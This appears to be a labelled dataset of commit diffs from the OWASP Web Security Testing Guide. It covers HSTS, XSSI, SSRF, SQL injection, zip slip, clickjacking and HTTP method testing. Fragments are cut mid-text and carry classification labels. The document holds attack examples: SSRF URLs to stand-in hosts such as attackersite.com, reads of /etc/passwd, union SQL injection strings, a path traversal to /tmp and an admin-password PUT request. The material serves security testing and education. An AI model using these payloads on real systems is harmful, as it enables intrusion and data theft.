Instead, it should automatically establish all connection requests to access the site through HTTPS. This also prevents users from overriding certificate errors.
+Considering the importance of this security measure, it is prudent to verify that the site is using this HTTP header in order to ensure that all the data travels encrypted between the web browser and the server.
+The HTTP strict transport security header uses three specific directives:
+    - While this is supported by all the major browsers, it is not an official part of the specification. (See [hstspreload.org](https://hstspreload.org/) for more information.)
+The presence of this header must be checked, as its absence could lead to security issues such as:
+- Attackers intercepting and accessing the information transferred over an unencrypted network channel.
+- Attackers carrying out manipulator-in-the-middle (MITM) attacks by taking advantage of users who accept untrusted certificates.
+- Users who mistakenly enter an address in the browser using HTTP instead of HTTPS, or users who click on a link in a web application that incorrectly uses the HTTP protocol.
+- Confirm the presence of the HSTS header by examining the server's response through an intercepting proxy.

+
+UI misrepresentation occurs when user-controlled input is rendered in trusted UI elements in a way that can mislead users or administrators, without requiring script execution. Unlike cross-site scripting, these issues rely on visual or contextual deception and can enable workflow abuse or social engineering within the application.
+
+These issues represent application misuse because they abuse legitimate UI workflows and trust boundaries rather than exploiting a technical vulnerability.
+
+Common examples include:
+
+- User-controlled filenames, titles, or labels displayed as system-generated messages
+- Renamed file uploads that appear as trusted documents or system artifacts
+- User-supplied text rendered as approval states, sender names, or workflow indicators
+
+For example: an application allows users to name uploaded files. An attacker uploads a file named
+""Payment Approved – Finance System"". When this filename is displayed in an administrative
+review workflow without clear indication that it is user-supplied, reviewers may be misled
+into approving a fraudulent process.
+
+During testing, assess whether:
+
+- User-controlled data is reflected in privileged or authoritative UI contexts
+- Injected text can mimic system messages, workflow states, or trusted labels
+- UI presentation could influence user decisions or business processes despite no technical exploit occurring

ee86d9f0fe2371f7df081709bd9a3e7e1cbba39a,Create 4.12.13 Testing for Cross Site Script Inclusion (XSSI)(OTG-CLIENT-013).md,"+# Summary
+
+Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication related data (login states, cookies, auth tokens, session IDs, etc.), user personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but they have a different purpose: CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (eg. transfer money to the attacker's account, modify privileges, reset password, etc.) and an XSSI attack uses a malicious webpage to leak sensitive data from authenticated sessions.
+
+By default websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by RFC 6454 [1]). An origin is defined as the combination of URI scheme (http/https), host name, and port number. However, this policy is bypassed/not appliable for <SCRIPT> HTML tag inclusions. This exception is necessary, without it websites and services would not be able to consume third party services, traffic analysis or advertisement platforms, etc.
+
+When the browser opens a website the <SCRIPT> resources are fetched from the cross-origin domain and they run in the same context as the including site/browser which presents the opportunity to leak sensitive data. This is in most cases JavaScript however it doesn't have to be a JavaScript file or be served with text/javascript or .js extension. Some browsers are lenient and only block it if it is served with an image type (image/), a video type (video/), an audio (audio/*) type, or text/csv [10].
+
+Old browser version vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime but those vulnerabilties have now been patched by vendors and are considered not relevant. By setting the charset attribute of the <SCRIPT> tag the attacker/tester can enforce UTF-16 encoding which allows data leakage for other data formats (eg JSON). If you want to learn more about these please read Takeshi Terada: Identifier based XSSI attacks MBSD Technical Whitepaper [8].
+
+The following XSSI vulnerability cases will be discussed:
+
+1. Leak sensitive data via global variables
+2. Leak sensitive data via global function parameters
+3. Leak sensitive data via non-JavaScript resource - CSV with quotations theft
+4. Leak sensitive data via JavaScript runtime errors

aec0b766d74dc320f7d883dd5202f16e21e071e8,Update Testing for Server-Side Request Forgery (SSRF),"+Overview
+In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or a modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.
+Description
+The target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.).
+Some common vulnerabilities related to server-side request forgery:
+- URL redirection
+- Remote file inclusion
+- SQL injection
+- Link Injection
+
+How to Test
+
+Case I: End points which fetch external/internal resources
+
+- With GET request:
+http://example.com/index.php?page=about.php
+http://example.com/index.php?page=https://attackersite.com
+http://example.com/index.php?page=file:///etc/passwd
+
+- With POST request:
+
+POST /test/ssrf_form.php HTTP/1.1
+Host: example.com
+
+url=https://hacker.com/as&name2=value2
+
+Case II: PDF generators - There are some cases where server converts uploaded file to a pdf.Try injecting <iframe>, <img>, <base> or <script> elements or CSS url() functions pointing to internal services.
+
+<iframe src=”file:///etc/passwd” width=”400"" height=”400"">

+
+## Summary
+Session fixation vulnerabilities occur when:
+- A web application authenticates a user without first invalidating the existing session ID, thereby continuing to use the session ID already associated with the user.
+- An attacker is able to force a known session ID on a user so that, once the user authenticates, the attacker has access to the authenticated session.
+## How to Test
+#### Testing for Session Fixation Vulnerabilities
+
+The first step is to make a request to the site to be tested (_e.g._ `www.example.com`). If the tester requests the following:

+## Summary
+Traditionally, the HTTP protocol only allows one request/response per TCP connection. Asynchronous JavaScript and XML (AJAX) allows clients to send and receive data asynchronously (in the background without a page refresh) to the server, however, AJAX requires the client to initiate the requests and wait for the server responses (half-duplex).
+
+[WebSockets](https://html.spec.whatwg.org/multipage/web-sockets.html#network) allow the client or server to create a 'full-duplex' (two-way) communication channel, allowing the client and server to truly communicate asynchronously. WebSockets conduct their initial *upgrade* handshake over HTTP and from then on all communication is carried out over TCP channels by use of frames. For more, see the [WebSocket Protocol](https://tools.ietf.org/html/rfc6455).
+It is the server’s responsibility to verify the [`Origin` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) in the initial HTTP WebSocket handshake. If the server does not validate the origin header in the initial WebSocket handshake, the WebSocket server may accept connections from any origin. This could allow attackers to communicate with the WebSocket server cross-domain allowing for CSRF-like issues. See also [Top 10-2017 A5-Broken Access Control](https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control).
+As with any data originating from untrusted sources, the data should be properly sanitized and encoded. See also [Top 10-2017 A1-Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection) and [Top 10-2017 A7-Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)).
+   - Inspect the client-side source code for the `ws://` or `wss://` URI scheme.
+   - Use Google Chrome's Developer Tools to view the Network WebSocket communication.
+   - Use [OWASP Zed Attack Proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (ZAP)'s WebSocket tab.
+   - Using a WebSocket client (one can be found in the [Tools](#Tools) section below) attempt to connect to the remote WebSocket server. If a connection is established the server may not be checking the origin header of the WebSocket handshake.
+   - Check that the WebSocket connection is using SSL to transport sensitive information (wss://).
+   - Check the SSL Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc). Refer to the [Testing for Weak SSL/TLS Ciphers, Insufficient Transport Layer Protection (OTG-CRYPST-001)](https://www.owasp.org/index.php/Testing_for_Weak_SSL/TLS_Ciphers,_Insufficient_Transport_Layer_Protection_(OTG-CRYPST-001)) section of this guide.
+   - WebSockets do not handle authentication, normal black-box authentication tests should be carried out. Refer to the [Authentication Testing](https://www.owasp.org/index.php/Testing_for_authentication) sections of this guide.
+   - WebSockets do not handle authorization, normal black-box authorization tests should be carried out. Refer to the [Authorization Testing](https://www.owasp.org/index.php/Testing_for_Authorization) sections of this guide.
+   - Use [OWASP Zed Attack Proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (ZAP)'s WebSocket tab to replay and fuzz WebSocket request and responses. Refer to the [Testing for Data Validation](https://www.owasp.org/index.php/Testing_for_Data_Validation) sections of this guide.

96048d1d35a35d52b9f4b5e64b6cbc46bca5e093,4.8.5.2 - v4 Migration Cleanup,"+# Testing for MySQL
+## Summary
+
+[SQL Injection](https://www.owasp.org/index.php/SQL_Injection) vulnerabilities occur whenever input is used in the construction of a SQL query without being adequately constrained or sanitized. The use of dynamic SQL (the construction of SQL queries by concatenation of strings) opens the door to these vulnerabilities. SQL injection allows an attacker to access the SQL servers. It allows for the execution of SQL code under the privileges of the user used to connect to the database.
+## How to Test
+MySQL comes with at least four versions which are used in production worldwide, `3.23.x`, `4.0.x`, `4.1.x` and `5.0.x`. Every version has a set of features proportional to version number.
+- From Version 4.0: UNION
+- From Version 4.1: Subqueries
+- From Version 5.0: Stored procedures, Stored functions and the view named `INFORMATION_SCHEMA`
+- From Version 5.0.2: Triggers
+It should be noted that for MySQL versions before 4.0.x, only Boolean or time-based Blind Injection attacks could be used, since the subquery functionality or `UNION` statements were not implemented.
+From now on, we will assume that there is a classic SQL injection vulnerability, which can be triggered by a request similar to the the one described in the Section on [Testing for SQL Injection](https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)).
+MySQL quote escaping is the following:
+
+`'A string with \'quotes\''`
+That is, MySQL interprets escaped apostrophes `\'` as characters and not as metacharacters.
+1. Web app escapes single quotes `'` => `\'`
+2. Web app does not escape single quotes `'` => `'`
+Let's suppose we want to know the value of a field named `password` in a record, with a condition like the following:
+1. password like `'A%'`
+2. The ASCII values in a concatenated hex:
+    `password LIKE 0x4125`
+3. The char() function:
+    `password LIKE CHAR(65,37)`
+### Multiple Mixed Queries
+MySQL library connectors do not support multiple queries separated by `;` so there's no way to inject multiple non-homogeneous SQL commands inside a single SQL injection vulnerability like in Microsoft SQL Server.
+### Information Gathering
+Of course, the first thing to know is if there's MySQL DBMS as a back end database. MySQL server has a feature that is used to let other DBMS ignore a clause in MySQL dialect. When a comment block `'/**/'` contains an exclamation mark `'/*! sql here*/'` it is interpreted by MySQL, and is considered as a normal comment block by other DBMS as explained in [MySQL manual](http://dev.mysql.com/doc/refman/5.0/en/comments.html).
+> If MySQL is present, the clause inside the comment block will be interpreted.
+1. By using the global variable `@@version`
+2. By using the function [VERSION()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_version)
+3. By using comment fingerprinting with a version number `/*!40110 and 1=0*/`
+which means
+```sql
+if(version >= 4.1.10)
+   add 'and 1=0' to the query.
+```
+The response would contain something to the lines of:
+1. [USER()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_user): the user connected to the MySQL Server.
+2. [CURRENT_USER()](https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_current-user): the internal user who is executing the query.
+There is some difference between 1 and 2. The main one is that an anonymous user could connect (if allowed) with any name, but the MySQL internal user is an empty name (''). Another difference is that a stored procedure or a stored function are executed as the creator user, if not declared elsewhere. This can be known by using `CURRENT_USER`.
+`1 AND 1=0 UNION SELECT USER()`
+The response would contain something to the lines of:
+#### Database Name in Use
+There is the native function `DATABASE()`
+`1 AND 1=0 UNION SELECT DATABASE()`
+> Expected Result, A string like this:
+>`dbname`
+#### INFORMATION_SCHEMA
+From MySQL 5.0 a view named [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html) was created. It allows us to get all informations about databases, tables, and columns, as well as procedures and functions.

14ec50f6349fa59f882935f97a520655d61d85ab,Update mapping application architecture (#796),"+In order to effectively test an application, and to be able to provide meaningful recommendations on how to address any of the issues identified, it is important to understand what you are actually testing. Additionally, it can help determine whether specific components should be considered out of scope for testing.
+Modern web applications can vary significantly in complexity, from a simple script running on a single server to a highly complex application spread across dozens of different systems, languages and components. There may also be additional network-level components such as firewalls or intrusion protection systems that can have a significant impact on testing.
+- Understand the architecture of the application and the technologies in use.
+When testing from a black box perspective, it is important to try and build up a clear picture of how the application works, and which technologies and components are in place. In some cases it is possible to test for specific components (such as a web application firewall), while others can be identified by inspecting the behaviour of the application.
+The sections below provide a high-level overview of common architectural components, along with details of how they can be identified.
+### Application Components
+#### Web Server
+Simple applications may run on a single server, which can be identified using the steps discussed in the [Fingerprint Web Server](02-Fingerprint_Web_Server.md) section of the guide.
+#### Platform-as-a-Service (PaaS)
+In a Platform-as-a-Service (PaaS) model, the web server and underlying infrastructure are managed by the service provider, and the customer is only responsible for the application that this deployed on them. From a testing perspective, there are two main differences:
+- The application owner has no access to the underlying infrastructure, so will be unable to directly remediate any issues.
+- Infrastructure testing is likely to be out of scope for any engagements.
+In some cases it is possible to identify the use of PaaS, as the application may use a specific domain name (for example, applications deployed on Azure App Services will have a `*.azurewebsites.net` domain - although they may also use custom domains). However, in other cases it is difficult to determine whether PaaS is in use.
+#### Serverless
+In a Serverless model, the developers provide code which is directly run on a hosting platform as individual functions, rather than as an traditional larger web application deployed in a webroot. This makes it well suited to microservice-based architectures. As with a PaaS environment, infrastructure testing is likely to be out of scope.
+In some cases the use of Serverless code may be indicated by the presence of specific HTTP headers. For example, AWS Lambda functions will typically return the following headers:
+```http
+X-Amz-Invocation-Type
+X-Amz-Log-Type
+X-Amz-Client-Context
+```
+
+Azure Functions are less obvious. They typically return the `Server: Kestrel` header - but this on its own is not enough to be confident that it is an Azure App function, rather than some other code running on Kestrel.
+
+#### Microservices
+
+In a microservice-based architecture, the application API is made up of multiple discrete services, rather than running as a monolithic application. The services themselves often run inside containers (usually with Kubernetes), and can use a variety of different operating systems and languages. Although they are typically behind a single API gateway and domain, the use of multiple languages (often indicated in detailed error messages) can suggest that microservices are in use.
+
+#### Static Storage
+
+Many applications store static content on dedicated storage platforms, rather than hosting it directly on the main web server. The two most common platforms are Amazon's S3 Buckets, and Azure's Storage Accounts, and can be easily identified by the domain names:
+
+- Amazon S3 Buckets are either `BUCKET.s3.amazonaws.com` or `s3.REGION.amazonaws.com/BUCKET`
+- Azure Storage Accounts are `ACCOUNT.blob.core.windows.net`
+
+These storage accounts can often exposes sensitive files, as discussed in the [Testing Cloud Storage Guide](../02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md) section.
+
+#### Database
+
+Most non-trivial web applications use some kind of database to store dynamic content. In some cases it's possible to determine the database, although it usually relies on other issues in the application. This can often be done by:
+
+- Port scanning the server and looking for any open ports associated with specific databases.
+- Triggering SQL (or NoSQL) related error messages (or finding existing errors from a [search engine](../01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md).
+
+Where it's not possible to conclusively determine the database, you can often make an educated guess based on other aspects of the app",1,Security Knowledge

353a4139cd4b272dfcc5891cf60bb1874ab519fe,Add tests for Archive Directory Traversal,"+A test against Archive Directory Traversal should include two parts:
+ 
+1. A malicious archive that breaks out of the target directory when extracted. For example, a compressed file contains two files: a “notinfected.sh” file, that is extracted into the target directory, and a “infected.sh” file, that attempts to navigate to the directory tree to hit the root folder and adds a file into the tmp directory. A malicious path could contain many levels of ""../"" (i.e. ../../../../../../../../tmp/infected.sh) to stand a better chance of reaching the root directory.  
+
+2. A functionality is required to extract compressed files, either using your own code or a library. Vulnerability exists when the extraction functionality don’t validate file paths in the archive. An example of a vulnerable code in Java can be seen below. 
+
+```java
+1: Enumeration<ZipEntry>entries=​​zip​.g​etEntries(); 
+2: while(entries​.h​asMoreElements()){
+3:      ZipEntry e ​=​entries.nextElement();
+4:      File f = new File(destinationDir, e.getName());
+5:      InputStream input =​​zip​.g​etInputStream(e);
+6:      IOUtils​.c​opy(input, write(f));

+
+Additional testing techniques:
+
+- Upload a malicious zip file and try to remote access this file when upload is completed.  [Watch it in action here](https://www.youtube.com/watch?v=l1MT5lr4p9o)
+- In the pipeline:  Include a unit test that uploads an infected compressed file against the extraction method.
+- Validate that libraries being used by the application have been (patched for this vulnerability)[https://github.com/snyk/zip-slip-vulnerability#affected-libraries]
+- Review implementation of upload methods in the application looking for vulnerable code. 
+- Vulnerability in the Java code above could be prevented by including a test that throws an exception:

+
+## Summary
+
+It is very common, and even recommended, for programmers to include detailed comments and metadata on their source code. However, comments and metadata included into the HTML code might reveal internal information that should not be available to potential attackers. Comments and metadata review should be done in order to determine if any information is being leaked.
+
+For modern web apps, the use of client-Side JavaScript for the front-end is becoming more popular. Popular front-end construction technologies use client-side JavaScript like ReactJS, AngularJS, or Vue.  Similar to the comments and metadata in HTML code, many programmers also hardcod sensitive information in JavaScript variables on the front-end. Sensitive information can include (but is not limited to): Private API Keys (*e.g.* an unrestricted Google Map API Key), internal IP addresses, sensitive routes (*e.g.* route to hidden admin pages or functionality), or even credentials. This sensitive information can be leaked from such front-end JavaScript code. A review should be done in order to determine if any sensitive information leaked which could be used by attackers for abuse.
+
+For large web applications, performance issues are a big concern to programmers. Programmers have used different methods to optimize front-end performance, including Syntactically Awesome StyleSheets (SASS), Sassy CSS (SCSS), WebPack, etc. Using these technologies, front-end code will sometimes become harder to understand and difficult to debug, and because of it, programmers often deploy source map files for debugging purposes. A “source map” is a special file that connects a minified/uglified version of an asset (CSS or JavaScript) to the original authored version. Programmers are still debating whether or not to bring source map files to the production environment. However, it is undeniable that source map files or files for debugging if released to the production environment will make their source more human-readable. It can make it easier for attackers to find vulnerabilities from the front-end or collect sensitive information from it. JavaScript code review should be done in order to determine if any debug files are exposed from the front-end. Depending on the context and sensitivity of the project, a security expert should decide whether the files should exist in the production environment or not.
+
+## Test Objectives
+
+* Review webpage comments and metadata to better understand the application and to find any information leakage.
+* Identify and gather JavaScript files, review JavaScript code in an application to better understand the application and to find any information leakage.
+* Identify if source map files or other front-end debug files exist.
+
+## How to Test
+
+### Review webpage comments and metadata
+
+HTML comments are often used by the developers to include debugging information about the application. Sometimes, they forget about the comments and they leave them in production environments. Testers should look for HTML comments which start with `<!--`.
+
+Check HTML source code for comments containing sensitive information that can help the attacker gain more insight about the application. It might be SQL code, usernames and passwords, internal IP addresses, or debugging information.
+
+```html
+...
+
+<div class=""table2"">
+  <div class=""col1"">1</div><div class=""col2"">Mary</div>
+  <div class=""col1"">2</div><div class=""col2"">Peter</div>
+  <div class=""col1"">3</div><div class=""col2"">Joe</div>
+
+<!-- Query: SELECT id, name FROM app.users WHERE active='1' -->
+
+</div>
+...
+```
+
+The tester may even find something like this:
+
+```html
+<!-- Use the DB administrator password for testing:  f@keP@a$$w0rD -->
+```
+
+Check HTML version information for valid version numbers and Data Type Definition (DTD) URLs
+
+```html
+<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01//EN"" ""http://www.w3.org/TR/html4/strict.dtd"">
+```
+
+* `strict.dtd` -- default strict DTD
+* `loose.dtd` -- loose DTD
+* `frameset.dtd` -- DTD for frameset documents
+
+Some `META` tags do not provide active attack vectors but instead allow an attacker to profile an application:
+
+```html
+<META name=""Author"" content=""Andrew Muller"">
+```
+
+A common (but not [WCAG](https://www.w3.org/WAI/standards-guidelines/wcag/) compliant) `META` tag is [Refresh](https://en.wikipedia.org/wiki/Meta_refresh).
+
+```html
+<META http-equiv=""Refresh"" content=""15;URL=https://www.owasp.org/index.html"">
+```
+
+A common use for `META` tag is to specify keywords that a search engine may use to improve the quality of search results.
+
+```html
+<META name=""keywords"" lang=""en-us"" content=""OWASP, security, sunshine, lollipops"">
+```

+Although most web servers manage search engine indexing via the `robots.txt` file, it can also be managed by `META` tags. The tag below will advise robots to no",1,Security Knowledge

+A `threat and countermeasure classification`, which takes into consideration root causes of vulnerabilities, is the critical factor in verifying that security controls are designed, coded, and built to mitigate the impact of the exposure of such vulnerabilities. In the case of web applications, the exposure of security controls to common vulnerabilities, such as the OWASP Top Ten, can be a good starting point to derive general security requirements. The [OWASP Testing Guide Checklist](https://github.com/OWASP/wstg/tree/master/checklist) is a helpful resource for guiding testers through specific vulnerabilities and validation tests.

+HTTP is a stateless protocol, meaning that it doesn't hold any reference to requests being sent by the same user. In order to fix this issue, sessions were created and appended to HTTP requests. Browsers, as discussed in [testing browser storage](../11-Client_Side_Testing/12-Testing_Browser_Storage.md), contain a multitude of storage mechanisms. In that section of the guide, each is discussed thoroughly.
+The [`SameSite`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies) attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent [cross-site request forgery](05-Testing_for_Cross_Site_Request_Forgery.md) attacks.

+In conjunction with other OWASP projects such as the Code Review Guide, the Development Guide and tools such as [OWASP ZAP](https://www.zaproxy.org/), this is a great start towards building and maintaining secure applications. This Testing Guide will show you how to verify the security of your running application. I highly recommend using these guides as part of your application security initiatives.
+There are a number of companies selling automated security analysis and testing tools. Remember the limitations of these tools so that you can use them for what they're good at. As Michael Howard put it at the 2006 OWASP AppSec Conference in Seattle, “Tools do not make software secure! They help scale the process and help enforce policy.”
+Please consider [joining us](https://owasp.org/membership/) as an individual or corporate member so that we can continue to produce materials like this testing guide and all the other great projects at OWASP.

b13eb8a263de275e6b940a02e40428fda35701f1,Fix linting in Appx.D_Encoded_Injection (#218),"+Character encoding is the process of mapping characters, numbers and other symbols to a standard format. Typically, this is done to create a message ready for transmission between sender and receiver. It is, in simple terms, the conversion of characters (belonging to different languages like English, Chinese, Greek or any other known language) into bytes. An example of a widely used character encoding scheme is the American Standard Code for Information Interchange (ASCII) that initially used 7-bit codes. More recent examples of encoding schemes would be the Unicode `UTF-8` and `UTF-16` computing industry standards.
+Web applications usually employ different types of input filtering mechanisms to limit the input that can be submitted by the user. If these input filters are not implemented sufficiently well, it is possible to slip a character or two through these filters. For instance, a `/` can be represented as `2F` (hex) in ASCII, while the same character (`/`) is encoded as `C0` `AF` in Unicode (2 byte sequence). Therefore, it is important for the input filtering control to be aware of the encoding scheme used. If the filter is found to be detecting only `UTF-8` encoded injections, a different encoding scheme may be employed to bypass this filter.
+Web browsers need to be aware of the encoding scheme used to coherently display a web page. Ideally, this information should be provided to the browser in the HTTP header (`Content-Type`) field, as shown below:
+or through HTML META tag (`META HTTP-EQUIV`), as shown below:
+Many web pages leave the character encoding (`charset` parameter in HTTP) undefined. In earlier versions of HTML and HTTP, the character encoding was supposed to default to `ISO-8859-1` if it wasn't defined. In fact, many browsers had a different default, so it was not possible to rely on the default being `ISO-8859-1`. HTML version 4 legitimizes this - if the character encoding isn't specified, any character encoding can be used.
+If the web server doesn't specify which character encoding is in use, it can't tell which characters are special. Web pages with unspecified character encoding work most of the time because most character sets assign the same characters to byte values below 128. But which of the values above 128 are special? Some 16-bit `character-encoding` schemes have additional multi-byte representations for special characters such as `<`. Some browsers recognize this alternative encoding and act on it. This is “correct” behavior, but it makes attacks using malicious scripts much harder to prevent. The server simply doesn't know which byte sequences represent the special characters.
+Therefore in the event of not receiving the character encoding information from the server, the browser either attempts to `guess` the encoding scheme or reverts to a default scheme. In some cases, the user explicitly sets the default encoding in the browser to a different scheme. Any such mismatch in the encoding scheme used by the web page (server) and the browser may cause the browser to interpret the page in a manner that is unintended or unexpected.
+All the scenarios given below form only a subset of the various ways obfuscation can be achieved to bypass input filters. Also, the success of encoded injections depends on the browser in use. For example, `US-ASCII` encoded injections were previously successful only in IE browser but not in Firefox. Therefore, it may be noted that encoded injections, to a large extent, are browser dependent.
+`String.fromCharCode` Javascript function takes the given Unicode values and returns the corresponding string. This is one of the most basic forms of encoded injections. Another vector that can be used to bypass this filter is:
+The above uses HTML Entities to construct the injection string. HTML Entities encoding is used to display characters that have a special meaning in HTML. For instance, `>` works as a closing bracket for a HTML tag. In order to actually display this character on the web page HTML character entities should be inserted in the page source. The injections mentioned above are one way of encoding. There are numerous other ways in which a string can be encoded (obfuscated) in order to bypass the above filter.
+Hex, short for Hexadecimal, is a base 16 numbering system i.e it has 16 different values from `0` to `9` and `A` to `F` to represent various characters. Hex encoding is another form of obfuscation that is sometimes used to bypass input validation filters. For instance, hex encoded version of the string `<IMG SRC=javascript:alert('XSS')>` is
+For the above script to work, the browser has to interpret the web page as encoded in `UTF-7`.",0,Noise / Non-knowledge

+##### Disabling javascript
+- Restricted frames with Internet Explorer: Starting from Internet Explorer 6, a frame can have the “security” attribute that, if it is set to the value “restricted”, ensures that JavaScript code, ActiveX controls, and re-directs to other sites do not work in the frame.
+```html
+<iframe src=""http://target site"" security=""restricted""></iframe>
+```
+- Sandbox attribute: with HTML5 there is a new attribute called “sandbox”. It enables a set of restrictions on content loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.
+```html
+<iframe src=""http://target site"" sandbox></iframe>

+##### OnBeforeUnload Event
+The `onBeforeUnload` event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating traget's frame busting attempt.
+```html
+<h1>www.fictitious.site</h1>
+<script>
+    window.onbeforeunload = function()
+    {
+        return "" Do you want to leave fictitious.site?"";

+##### XSS Filter
+
+- **IE8 XSS filter**: this filter has visibility into all parameters of each request and response flowing through the web browser and it compares them to a set of regular expressions in order to look for reflected XSS attempts. When the filter identifies a possible XSS attacks; it disables all inline scripts within the page, including frame busting scripts (the same thing could be done with external scripts). For this reason an attacker could induce a false positive by inserting the beginning of the frame busting script into a request's parameters.
+```html
+<script>
+    if ( top != self )
+    {
+        top.location=self.location;
+    }

+```
+```html
+<iframe src=”http://target site/?param=<script>if”>
+```
+- **Chrome 4.0 XSSAuditor filter**: It has a little different behaviour compared to IE8 XSS filter, in fact with this filter an attacker could deactivate a “script” by passing its code in a request parameter. This enables the framing page to specifically target a single snippet containing the frame busting code, leaving all the other codes intact.
+```html
+<script>
+    if ( top != self )
+    {
+        top.location=self.location;

This is a key application security principle and governed by the same-origin policy (defined by RFC 6454 - [https://tools.ietf.org/html/rfc6454]). An origin is defined as the combination of URI scheme (http/https), host name, and port number. However, this policy is bypassed/not applicable for <script> HTML tag inclusions. This exception is necessary as without it websites would not be able to consume third party services, traffic analysis, or advertisement platforms, etc.
+Old browser's vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilties have now been patched by vendors and are considered less relevant. By setting the charset attribute of the <script> tag the attacker/tester can enforce UTF-16 encoding which allows data leakage for other data formats (e.g. JSON) in some cases. If you want to learn more about these please read  [Identifier based XSSI attacks MBSD Whitepaper](https://www.mbsd.jp/Whitepaper/xssi.pdf).
+1. Leak sensitive data via global variables.
+2. Leak sensitive data via global function parameters.
+3. Leak sensitive data via non-JavaScript resource - CSV (Comma Separated Values) with quotations theft.
+4. Leak sensitive data via JavaScript runtime errors.
+3. The attacker lures the user to attackingwebsite.com via social engineering, phishing emails, etc. This step requires the user to authenticate first to victim.com before visiting attackingwebsite.com.
+4. The user's browser fetches api.js and the sensitive data is leaked via the global JavaScript variable and displayed using innerHTML. 
+To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example is an excerpt from Takeshi Terada's identifier based XSSI attacks whitepaper [8]:
+1. Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using JSONP. To find dynamically generated JavaScript responses generate authenticated and unauthenticated requests then compare/diff them. If they're different then the response is dynamic otherwise it's static. To simplify this task a purpose built Burp proxy plugin by Veit Hailperin can be used [2]. Make sure to check other filetypes in addition to JavaScript: XSSI is not limited to JavaScript files and is much more widespread.",1,Security Knowledge

While GET and POST are by far the most common methods that are used to access information provided by a web server, HTTP allows several other (and somewhat less known) methods. Some of these can be used for nefarious purposes if the web server is misconfigured.
+[RFC 7231 –  Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content](https://tools.ietf.org/html/rfc7231) defines the following valid HTTP request methods, or verbs:
+- [`GET`](https://tools.ietf.org/html/rfc7231#section-4.3.1)
+- [`HEAD`](https://tools.ietf.org/html/rfc7231#section-4.3.2)
+- [`POST`](https://tools.ietf.org/html/rfc7231#section-4.3.3)
+- [`PUT`](https://tools.ietf.org/html/rfc7231#section-4.3.4)
+- [`DELETE`](https://tools.ietf.org/html/rfc7231#section-4.3.5)
+- [`CONNECT`](https://tools.ietf.org/html/rfc7231#section-4.3.6)
+- [`OPTIONS`](https://tools.ietf.org/html/rfc7231#section-4.3.7)
+- [`TRACE`](https://tools.ietf.org/html/rfc7231#section-4.3.8)
+However, most web applications only need to respond to GET and POST requests, receiving user data in the URL query string or appended to the request respectively. The standard `<a href=""""></a>` style links as well as forms defined wihtout a method trigger a GET request; form data submitted via `<form method='POST'></form>` trigger POST requests. JavaScript and AJAX calls may send methods other than GET and POST but should usally not need to do that. If an application has to accept other methods, e.g. when implementing a RESTful Web Service, test it thoroughly to make sure that all endpoints only accept the methods that they require and that attacks such as Cross-Site Tracing (XST) are not possible.
+Also, verify that the web application authenticates and authorizes all requests regardless of request method, e.g. if a GET request for an endpoint requires authentication and authorization then a POST request to the same endpoint should typically also require authentication and authorization and so should typically a HEAD request as well.
+To perform this test, the tester needs some way to figure out which HTTP methods are supported by the web server that is being examined. While the OPTIONS HTTP method provides a direct way to do that, use a tool such as the http-methods nmap script to verify the servers response to the OPTIONS request.
+To use the http-methods nmap script to test the endpoint `/admin` on the server `localhost` using HTTPs, issue the command `nmap -p 443 --script http-methods --script-args http-methods.url-path='/index.php' localhost`
+### Testing for Access Control Bypass
+Find a page to visit that has a security constraint such that a GET request would normally force a 302 redirect to a log in page or force a log in directly. Issue requests using various methods such as HEAD, POST, PUT etc. as well as arbitrarily made up methods such as BILBAO, FOOBAR, CATS etc., if the web application responds with a `HTTP/1.1 200 OK` that is not a login page, it may be possible to bypass authentication and/or authorization. The following example uses netcat, to test web applications using HTTPs, substitute netcat for another tool such as NMAPs `ncat`.
+If the system appears vulnerable, issue CSRF-like attacks such as the following to exploit the issue more fully:
+- PUT /admin/changePw.php?member=myAdmin&passwd=foo123&confirm=foo123
